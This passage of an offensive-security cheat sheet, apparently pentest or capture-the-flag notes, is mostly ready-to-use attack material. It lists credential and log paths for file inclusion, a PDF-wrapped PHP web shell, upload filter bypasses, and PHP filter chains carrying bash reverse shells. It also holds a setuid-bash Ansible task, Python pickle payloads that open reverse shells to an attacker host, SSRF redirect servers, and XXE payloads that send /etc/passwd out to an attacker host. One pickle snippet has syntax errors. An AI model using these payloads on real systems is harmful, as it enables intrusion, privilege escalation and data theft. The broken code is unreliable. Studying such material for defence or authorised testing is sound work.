/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

##### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

#### PDF PHP Inclusion

Create a file with a PDF header, which contains PHP code.

```c
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

```c
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

#### PHP Upload Filter Bypasses

```c
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```

```c
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```

```c
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

#### PHP Generic Gadget Chains (PHPGGC)

```c
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

#### Server-Side Request Forgery (SSRF)

```c
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

#### Server-Side Template Injection (SSTI)

##### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
%>
-->
```

#### Bad YAML

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

#### Exploit Skeleton Python Script

```c
#!/usr/bin/python

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```

#### JSON POST Request

```c
POST /<path> HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 95
Connection: close

{
  "auth":{
    "name":"<USERNAME>",
    "password":"<PASSWORD>"
  },
  "filename":"<FILE>"
}
```

#### Python Pickle RCE

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> <LHOST> > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

```python
import base64
import pickle
import os

class RCE:
	def __reduce__(self):
		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
		return = os.system, (cmd, )

if __name__ == '__main__':
	pickle = pickle.dumps(RCE())
	print(bas64.b64encode(pickled))
```

#### Python Redirect for SSRF

```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
```

```c
sudo python3 redirect.py http://127.0.0.1:3000/
```

```python
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

#### Python Web Request

```python
import requests
import re

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }
// get a session
r = requests.get('http://')
// send request
r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
```

#### XML External Entity (XXE)

##### Request

```c
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
<root>
<method>GET</method>
<uri>/</uri>
<user>
<username><NAME>;</username>
<password><NAME></password>
</user>
</root>
```

##### Content of <FILE>.dtd

```c
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
%eval;
%exfiltrate;
```
